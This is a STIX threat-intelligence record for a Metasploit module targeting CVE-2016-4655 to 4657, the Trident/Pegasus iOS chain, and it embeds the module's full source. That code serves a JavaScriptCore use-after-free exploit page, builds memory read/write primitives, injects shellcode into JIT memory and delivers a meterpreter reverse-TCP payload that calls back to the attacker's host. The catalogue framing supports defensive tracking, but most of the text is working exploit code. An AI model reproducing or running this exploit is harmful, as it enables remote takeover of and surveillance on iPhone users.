{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86702839-c26e-46e5-b037-160193a797b6",
    "created": "2024-08-14T16:34:07.989043Z",
    "modified": "2024-08-14T16:34:07.989048Z",
    "name": "WebKit not_number defineProperties UAF",
    "description": " This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/apple_ios/browser/webkit_trident.rb",
            "external_id": "webkit_trident.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4655"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4656"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4657"
        },
        {
            "source_name": "reference",
            "url": "https://blog.lookout.com/trident-pegasus"
        },
        {
            "source_name": "reference",
            "url": "https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/"
        },
        {
            "source_name": "reference",
            "url": "https://www.blackhat.com/docs/eu-16/materials/eu-16-Bazaliy-Mobile-Espionage-in-the-Wild-Pegasus-and-Nation-State-Level-Attacks.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Siguza/PhoenixNonce"
        },
        {
            "source_name": "reference",
            "url": "https://jndok.github.io/2016/10/04/pegasus-writeup/"
        },
        {
            "source_name": "reference",
            "url": "https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/benjamin-42/Trident"
        },
        {
            "source_name": "reference",
            "url": "http://blog.tihmstar.net/2018/01/modern-post-exploitation-techniques.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WebKit not_number defineProperties UAF',\n      'Description'    => %q{\n          This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'qwertyoruiop', # jbme.qwertyoruiop.com\n        'siguza',       # PhoenixNonce\n        'tihmstar',     # PhoenixNonce\n        'benjamin-42',  # Trident\n        'timwr',        # metasploit integration\n        ],\n      'References'     => [\n          ['CVE', '2016-4655'],\n          ['CVE', '2016-4656'],\n          ['CVE', '2016-4657'],\n          ['BID', '92651'],\n          ['BID', '92652'],\n          ['BID', '92653'],\n          ['URL', 'https://blog.lookout.com/trident-pegasus'],\n          ['URL', 'https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/'],\n          ['URL', 'https://www.blackhat.com/docs/eu-16/materials/eu-16-Bazaliy-Mobile-Espionage-in-the-Wild-Pegasus-and-Nation-State-Level-Attacks.pdf'],\n          ['URL', 'https://github.com/Siguza/PhoenixNonce'],\n          ['URL', 'https://jndok.github.io/2016/10/04/pegasus-writeup/'],\n          ['URL', 'https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html'],\n          ['URL', 'https://github.com/benjamin-42/Trident'],\n          ['URL', 'http://blog.tihmstar.net/2018/01/modern-post-exploitation-techniques.html'],\n        ],\n      'Arch'           => ARCH_AARCH64,\n      'Platform'       => 'apple_ios',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/aarch64/meterpreter_reverse_tcp' },\n      'Targets'        => [[ 'Automatic', {} ]],\n      'DisclosureDate' => '2016-08-25'))\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 8080 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use for this exploit.\", \"/\" ])\n      ])\n  end\n\n  def payload_url\n    \"tcp://#{datastore[\"LHOST\"]}:#{datastore[\"LPORT\"]}\"\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request from #{request['User-Agent']}\")\n    if request.uri =~ %r{/loader32$}\n      print_good(\"armle target is vulnerable.\")\n      local_file = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2016-4655\", \"exploit32\" )\n      loader_data = File.read(local_file, mode: 'rb')\n      srvhost = Rex::Socket.resolv_nbo_i(srvhost_addr)\n      config = [srvhost, srvport].pack(\"Nn\") + payload_url\n      payload_url_index = loader_data.index('PAYLOAD_URL')\n      loader_data[payload_url_index, config.length] = config\n      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})\n      return\n    elsif request.uri =~ %r{/loader64$}\n      print_good(\"aarch64 target is vulnerable.\")\n      local_file = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2016-4655\", \"loader\" )\n      loader_data = File.read(local_file, mode: 'rb')\n      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})\n      return\n    elsif request.uri =~ %r{/exploit64$}\n      local_file = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2016-4655\", \"exploit\" )\n      loader_data = File.read(local_file, mode: 'rb')\n      payload_url_index = loader_data.index('PAYLOAD_URL')\n      loader_data[payload_url_index, payload_url.length] = payload_url\n      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})\n      print_status(\"Sent exploit (#{loader_data.size} bytes)\")\n      return\n    elsif request.uri =~ %r{/payload32$}\n      payload_data = MetasploitPayloads::Mettle.new('arm-iphone-darwin').to_binary :dylib_sha1\n      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream'})\n      print_status(\"Sent payload (#{payload_data.size} bytes)\")\n      return\n    end\n    html = %Q^\n<html>\n<body>\n<script>\n\nfunction load_binary_resource(url) {\n  var req = new XMLHttpRequest();\n  req.open('GET', url, false);\n  req.overrideMimeType('text/plain; charset=x-user-defined');\n  req.send(null);\n  return req.responseText;\n}\n\nvar pressure = new Array(400);\nvar bufs = new Array(10000);\n\nvar fcp = 0;\nvar smsh = new Uint32Array(0x10);\n\nvar trycatch = \"\";\nfor(var z=0; z<0x4000; z++) trycatch += \"try{} catch(e){}; \";\nvar fc = new Function(trycatch);\n\nfunction dgc() {\n  for (var i = 0; i < pressure.length; i++) {\n    pressure[i] = new Uint32Array(0xa000);\n  }\n  for (var i = 0; i < pressure.length; i++) {\n    pressure[i] = 0;\n  }\n}\n\nfunction swag() {\n  if(bufs[0]) return;\n\n  dgc();\n\n  for (i=0; i < bufs.length; i++) {\n    bufs[i] = new Uint32Array(0x100*2)\n    for (k=0; k < bufs[i].length; )\n    {\n      bufs[i][k++] = 0x41414141;\n      bufs[i][k++] = 0xffff0000;\n    }\n  }\n}\n\nvar mem0=0;\nvar mem1=0;\nvar mem2=0;\n\nfunction read4(addr) {\n  mem0[4] = addr;\n  var ret = mem2[0];\n  mem0[4] = mem1;\n  return ret;\n}\n\nfunction write4(addr, val) {\n  mem0[4] = addr;\n  mem2[0] = val;\n  mem0[4] = mem1;\n}\n\n_dview = null;\nfunction u2d(low, hi) {\n  if (!_dview) _dview = new DataView(new ArrayBuffer(16));\n  _dview.setUint32(0, hi);\n  _dview.setUint32(4, low);\n  return _dview.getFloat64(0);\n}\n\nfunction go_(){\n  var arr = new Array(0x100);\n  var not_number = {};\n  not_number.toString = function() {\n    arr = null;\n    props[\"stale\"][\"value\"] = null;\n    swag();\n    return 10;\n  };\n\n  smsh[0] = 0x21212121;\n  smsh[1] = 0x31313131;\n  smsh[2] = 0x41414141;\n  smsh[3] = 0x51515151;\n  smsh[4] = 0x61616161;\n  smsh[5] = 0x71717171;\n  smsh[6] = 0x81818181;\n  smsh[7] = 0x91919191;\n\n  var props = {\n    p0 : { value : 0 },\n    p1 : { value : 1 },\n    p2 : { value : 2 },\n    p3 : { value : 3 },\n    p4 : { value : 4 },\n    p5 : { value : 5 },\n    p6 : { value : 6 },\n    p7 : { value : 7 },\n    p8 : { value : 8 },\n    length : { value : not_number },\n    stale : { value : arr },\n    after : { value : 666 }\n  };\n\n  var target = [];\n  var stale = 0;\n  Object.defineProperties(target, props);\n  stale = target.stale;\n\n  if (stale.length != 0x41414141){\n    location.reload();\n    return;\n  }\n\n  var obuf = new Uint32Array(2);\n  obuf[0] = 0x41414141;\n  obuf[1] = 0xffff0000;\n\n  stale[0] = 0x12345678;\n  stale[1] = {};\n\n  for(var z=0; z<0x100; z++) fc();\n\n  for (i=0; i < bufs.length; i++) {\n    var dobreak = 0;\n    for (k=0; k < bufs[0].length; k++) {\n      if (bufs[i][k] == 0x12345678) {\n        if (bufs[i][k+1] == 0xFFFF0000) {\n          stale[0] = fc;\n          fcp = bufs[i][k];\n          stale[0] = {\n            'a': u2d(105, 0),\n            'b': u2d(0, 0),\n            'c': smsh,\n            'd': u2d(0x100, 0)\n          }\n          stale[1] = stale[0];\n          bufs[i][k] += 0x10;\n          bck = stale[0][4];\n          stale[0][4] = 0;\n          stale[0][6] = 0xffffffff;\n          mem0 = stale[0];\n          mem1 = bck;\n          mem2 = smsh;\n          bufs.push(stale);\n          if (smsh.length != 0x10) {\n            var filestream = load_binary_resource(\"loader64\");\n            var macho = load_binary_resource(\"exploit64\");\n            r2 = smsh[(fcp+0x18)/4];\n            r3 = smsh[(r2+0x10)/4];\n            var jitf = smsh[(r3+0x10)/4];\n            write4(jitf, 0xd28024d0);     //movz x16, 0x126\n            write4(jitf + 4, 0x58000060);   //ldr x0, 0x100007ee4\n            write4(jitf + 8, 0xd4001001);   //svc 80\n            write4(jitf + 12, 0xd65f03c0);  //ret\n            write4(jitf + 16, jitf + 0x20);\n            write4(jitf + 20, 1);\n            fc();\n            var dyncache = read4(jitf + 0x20);\n            var dyncachev = read4(jitf + 0x20);\n            var go = 1;\n            while (go) {\n              if (read4(dyncache) == 0xfeedfacf) {\n                for (i = 0; i < 0x1000 / 4; i++) {\n                  if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever\n                  {\n                    go = 0;\n                    break;\n                  }\n                }\n              }\n              dyncache += 0x1000;\n            }\n            dyncache -= 0x1000;\n            var bss = [];\n            var bss_size = [];\n            for (i = 0; i < 0x1000 / 4; i++) {\n              if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {\n                bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);\n                bss_size.push(read4(dyncache + i * 4 + (0x28)));\n              }\n            }\n            var shc = jitf;\n            for (var i = 0; i < filestream.length;) {\n              var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);\n              write4(shc, word);\n              shc += 4;\n              i += 4;\n            }\n            jitf &= ~0x3FFF;\n            jitf += 0x8000;\n            write4(shc, jitf);\n            write4(shc + 4, 1);\n            // copy macho\n            for (var i = 0; i < macho.length;i+=4) {\n              var word = (macho.charCodeAt(i) & 0xff) | ((macho.charCodeAt(i + 1) & 0xff) << 8) | ((macho.charCodeAt(i + 2) & 0xff) << 16) | ((macho.charCodeAt(i + 3) & 0xff) << 24);\n              write4(jitf+i, word);\n            }\n            for (var i = 0; i < bss.length; i++) {\n              for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {\n                write4(bss[i] + k * 4, 0);\n              }\n            }\n            fc();\n          }\n        } else if(bufs[i][k+1] == 0xFFFFFFFF) {\n          stale[0] = fc;\n          fcp = bufs[i][k];\n          stale[0] = smsh;\n          stale[2] = {'a':u2d(0x2,0x10),'b':smsh, 'c':u2d(0,0), 'd':u2d(0,0)}\n          stale[0] = {'a':u2d(0,0x00e00600),'b':u2d(1,0x10), 'c':u2d(bufs[i][k+2*2]+0x10,0), 'd':u2d(0,0)}\n          stale[1] = stale[0];\n          bufs[i][k] += 0x10;\n          var leak = stale[0][0].charCodeAt(0);\n          leak += stale[0][1].charCodeAt(0) << 8;\n          leak += stale[0][2].charCodeAt(0) << 16;\n          leak += stale[0][3].charCodeAt(0) << 24;\n          bufs[i][k] -= 0x10;\n          stale[0] = {'a':u2d(leak,0x00602300), 'b':u2d(0,0), 'c':smsh, 'd':u2d(0,0)}\n          stale[1] = stale[0];\n          bufs[i][k] += 0x10;\n          stale[0][4] = 0;\n          stale[0][5] = 0xffffffff;\n          bufs[i][k] -= 0x10;\n          mem0 = stale[0];\n          mem2 = smsh;\n          if (smsh.length != 0x10) {\n            setTimeout(function() {\n              var filestream = load_binary_resource(\"loader32\");\n              r2 = smsh[(fcp+0x14)/4];\n              r3 = smsh[(r2+0x10)/4];\n              shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;\n              smsh[shellcode/4] = 0;\n              shellcode += 4;\n              smsh[shellcode/4] = 0;\n              shellcode += 4;\n              smsh[shellcode/4] = 0;\n              shellcode += 4;\n              smsh[shellcode/4] = 0;\n              shellcode += 4;\n              for(var i = 0; i < filestream.length; i+=4) {\n                var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);\n                smsh[(shellcode+i)/4] = word;\n              }\n              smsh[(fcp+0x00)/4] = fcp+4;\n              smsh[(fcp+0x04)/4] = fcp+4;\n              smsh[(fcp+0x08)/4] = shellcode+1; //PC\n              smsh[(fcp+0x30)/4] = fcp+0x30+4-0x18-0x34+0x8;\n\n              fc();\n            }, 100);\n          }\n        } else {\n          location.reload();\n        }\n        dobreak = 1;\n        break;\n      }\n    }\n    if (dobreak) break;\n  }\n  location.reload();\n}\n\nsetTimeout(go_, 300);\n\n\n</script>\n</body>\n</html>\n    ^\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-08-25",
    "x_mitre_platforms": [
        "apple_ios'"
    ]
}